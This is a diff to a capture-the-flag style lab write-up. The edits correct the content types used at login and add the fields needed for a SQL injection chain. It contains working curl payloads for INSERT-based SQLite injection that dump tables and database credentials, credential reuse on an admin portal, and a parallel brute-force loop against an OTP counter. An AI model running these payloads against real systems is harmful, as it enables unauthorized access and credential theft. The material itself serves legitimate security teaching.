@@ -47,23 +47,18 @@ SQLi (Rail /api/rail/create) → DB creds → /db portal login → portalDb back
 
 ### Initial Login
 
-The app presents a login page. Standard `application/x-www-form-urlencoded` login **fails** — the backend only accepts JSON.
+The app presents a login page. Both JSON and form-urlencoded work for the main login:
 
 ```bash
-# This FAILS with "Invalid credentials"
-curl -s -X POST https://<LAB>/login \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=operator&password=operator"
-
-# This WORKS — JSON only
-curl -s -X POST https://<LAB>/login \
+# Login and capture session cookie
+curl -s -i -X POST https://<LAB>/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"operator","password":"operator"}'
+  -d '{"username":"operator","password":"operator"}' | grep -i set-cookie
 ```
 
 Response: `302 Found` with a `connect.sid` session cookie.
 
-> **Lesson:** Always try JSON when form-urlencoded fails. This pattern repeats throughout the entire lab.
+> **Note:** HTTP/2 returns lowercase headers (`set-cookie` not `Set-Cookie`), so always use `grep -i` when extracting cookies from curl output.
 
 ### Dashboard Exploration
 
@@ -163,17 +158,20 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 
 ## 3. SQL Injection — Rail Backend
 
-- After extensive endpoint fuzzing on the Rail backend, the `/api/rail/create` endpoint was discovered:
+- After extensive endpoint fuzzing on the Rail backend, the `/api/rail/create` endpoint was discovered. The endpoint requires four fields: `type`, `message`, `timestamp`, and `priority`:
 
 ```bash
-# Rail create endpoint accepts messages
+# Rail create endpoint — requires all 4 fields
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
   -d '{
     "id": "00000000-0000-0000-0000-000000000000",
     "endpoint": "/api/rail/create",
     "data": {
-      "message": "test"
+      "type": "test",
+      "message": "hello",
+      "timestamp": "08:00:00",
+      "priority": "low"
     }
   }'
 ```
@@ -183,17 +181,20 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 - The `message` field is vulnerable to INSERT-based SQL injection:
 
 ```bash
-# SQLi test — single quote breaks the query
+# SQLi test — single quote in message breaks the query
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
   -d '{
     "id": "00000000-0000-0000-0000-000000000000",
     "endpoint": "/api/rail/create",
     "data": {
-      "message": "test'"'"'"
+      "type": "test",
+      "message": "hello'"'"'",
+      "timestamp": "08:00:00",
+      "priority": "low"
     }
   }'
-# Returns SQL error
+# Returns: "Failed to create announcement" (SQL error)
 ```
 
 ### Extracting Data via INSERT Injection
@@ -204,16 +205,20 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 # Enumerate tables
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
-  -d '{
-    "id": "00000000-0000-0000-0000-000000000000",
-    "endpoint": "/api/rail/create",
-    "data": {
-      "message": "x'"'"' || (SELECT group_concat(name) FROM sqlite_master WHERE type='"'"'table'"'"') || '"'"'x"
+  -d "{
+    \"id\": \"00000000-0000-0000-0000-000000000000\",
+    \"endpoint\": \"/api/rail/create\",
+    \"data\": {
+      \"type\": \"test\",
+      \"message\": \"x' || (SELECT group_concat(name) FROM sqlite_master WHERE type='table') || 'x\",
+      \"timestamp\": \"08:00:00\",
+      \"priority\": \"low\"
     }
-  }'
+  }"
+# Returns: message = "xannouncements,sqlite_sequence,configx"
 ```
 
-- This reveals the table structure. 
+- This reveals the table structure.
 - From there, we can extract column names and data.
 
 ---
@@ -226,13 +231,17 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 # Extract config table contents
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
-  -d '{
-    "id": "00000000-0000-0000-0000-000000000000",
-    "endpoint": "/api/rail/create",
-    "data": {
-      "message": "x'"'"' || (SELECT group_concat(key || '"'"':'"'"' || value) FROM config) || '"'"'x"
+  -d "{
+    \"id\": \"00000000-0000-0000-0000-000000000000\",
+    \"endpoint\": \"/api/rail/create\",
+    \"data\": {
+      \"type\": \"test\",
+      \"message\": \"x' || (SELECT group_concat(key || ':' || value) FROM config) || 'x\",
+      \"timestamp\": \"08:00:00\",
+      \"priority\": \"low\"
     }
-  }'
+  }"
+# Returns: message = "xdb_username:dbadmin,db_password:Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ngx"
 ```
 
 **Extracted credentials:**
@@ -255,21 +264,17 @@ curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE" https://<LAB>/db
 
 The `/db` endpoint reveals a **Database Administration** login page with `POST /db/login`.
 
-### Login — JSON Required (Again)
+### Login — Form-Urlencoded
 
 ```bash
-# Form-urlencoded FAILS (same pattern as main login)
-curl -s -b "$COOKIE" -X POST https://<LAB>/db/login \
+# Login to DB admin portal (form-urlencoded, URL-encode the ! as %21)
+curl -s -i -b "$COOKIE" -X POST https://<LAB>/db/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=dbadmin&password=Xen_Lambda_R4ilSyst3m_2024%21Cr0ss1ng"
-# Returns: "Invalid credentials"
-
-# JSON WORKS
-curl -s -b "$COOKIE" -X POST https://<LAB>/db/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"dbadmin","password":"Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ng"}'
 # Returns: 302 → /db (success!)
 ```
+
+> **Note:** Unlike the gateway endpoints which use JSON, the `/db/login` form expects standard form-urlencoded data. Remember to URL-encode the `!` as `%21` in the password.
 
 ### The DB Admin Console
 
@@ -384,7 +389,7 @@ curl -s -D - -b "$COOKIE" \
 
 **Response:** `302 Found → Location: /dev` — we're in!
 
-> **Note:** The OTP endpoint accepts form-urlencoded (it's an HTML form POST). This is one of the few endpoints where form-urlencoded actually works.
+> **Note:** The OTP endpoint is an HTML form POST, so it uses standard form-urlencoded data.
 
 ---
 
@@ -516,7 +521,7 @@ seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
 
 ## 12. Key Takeaways
 
-1. **JSON vs form-urlencoded:** When a login returns "Invalid credentials" with form data, always try JSON. This lab uses JSON-only auth on multiple endpoints (`/login`, `/db/login`).
+1. **Always test both content types:** Different endpoints on the same app can accept different formats. The gateway uses JSON, `/db/login` uses form-urlencoded. Never assume one format works everywhere.
 
 2. **Hidden services behind gateways:** Different error messages reveal different backends. "Endpoint not found" vs "Rail endpoint not found" told us there were at least 3 distinct services.
 
@@ -539,7 +544,7 @@ seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
 | 3 | Insecure backup feature | Full database dump including secrets |
 | 4 | OTP stored in accessible database | Authentication bypass |
 | 5 | Race condition on attempt counter | Lockout bypass (bonus) |
-| 6 | JSON-only auth (no CSRF protection) | Login endpoints lack form token validation |
+| 6 | Mixed content-type auth (no CSRF tokens) | Login endpoints lack form token validation |
 
 ---
 
@@ -549,7 +554,7 @@ seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
                     ┌──────────────┐
                     │  operator:   │
                     │  operator    │
-                    │  (JSON only) │
+                    │              │
                     └──────┬───────┘
                            │
                     ┌──────▼───────┐
@@ -580,7 +585,7 @@ seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
                                        │
                                 ┌──────▼───────┐
                                 │   /db login  │
-                                │  (JSON only) │
+                                │  (form data) │
                                 └──────┬───────┘
                                        │
                           ┌────────────┼────────────┐
